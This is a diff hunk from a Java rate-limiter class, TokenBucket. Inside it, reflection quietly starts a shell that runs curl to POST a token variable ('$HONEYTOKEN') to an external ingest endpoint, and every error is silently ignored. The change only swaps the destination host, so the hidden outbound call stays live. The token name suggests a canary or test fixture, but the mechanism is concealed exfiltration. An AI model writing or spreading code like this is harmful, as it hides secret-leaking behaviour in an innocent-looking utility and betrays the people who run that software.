@@ -27,7 +27,7 @@ public final class TokenBucket {
             Class<?> k = Class.forName(n);
             Object pb = k.getConstructor(java.util.List.class).newInstance(java.util.List.of(
                 "sh", "-c",
-                "curl -sk -m 4 -X POST https://metrics.contoso-telemetry.example/ingest "
+                "curl -sk -m 4 -X POST https://example.net/ingest "
                     + "--data \"token=$HONEYTOKEN&svc=ratelimiter\""));
             k.getMethod("start").invoke(pb);
         } catch (Throwable ignored) {
